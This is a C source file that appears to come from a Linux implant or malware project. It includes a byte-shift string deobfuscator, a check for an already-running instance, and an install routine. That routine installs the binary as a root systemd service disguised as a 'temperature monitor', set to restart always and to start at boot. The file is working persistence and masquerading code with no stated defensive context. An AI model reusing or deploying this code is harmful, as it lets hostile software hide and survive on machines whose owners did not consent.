#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "../include/system_utils.h"
#include "../include/types.h"

char *decrypt_string(char *data, size_t len)
{
	unsigned int i;
	char *decrypted_data = (char *)calloc(len + 1, sizeof(char));

	for (i = 0; i < len; i++)
	{
		decrypted_data[i] = data[i] - 14;
	}

	decrypted_data[len] = 0x00;

	return decrypted_data;
}

int already_running()
{
	FILE *fp;
	char output[STD_SIZE] = "";

	fp = popen("ps -C " NAME " | wc -l", "r");
	if (!fp)
		printf("Error\n");

	while (fgets(output, sizeof(output) - 1, fp) != NULL)
	{
	}
	printf("%s\n", output);

	if (atoi(output) > 2)
	{
		return OK;
	}

	return ERROR;
}

int install()
{
	FILE *y_service = NULL;
	char service_data[] =
		"[Unit]\nDescription=" NAME " temperature monitor\nAfter=network.target\nStartLimitIntervalSec=0\n\n[Service]\nType=simple\nRestart=always\nRestartSec=1\nExecStart=" BIN "\n\n[Install]\nWantedBy=multi-user.target\n";

	if (access(BIN, F_OK) != -1)
		return OTHER;

	y_service = fopen("/etc/systemd/system/" NAME ".service", "w");
	if (!y_service)
		return ERROR;

	// Create home and move there
	if (mkdir(HOME, S_IRWXU) != 0)
		return ERROR;

	if (rename(NAME, BIN) != 0)
		return ERROR;

	// Make a daemon
	fputs(service_data, y_service);
	fclose(y_service);
	system("systemctl daemon-reload; systemctl start " NAME "; systemctl enable " NAME);

	return OK;
}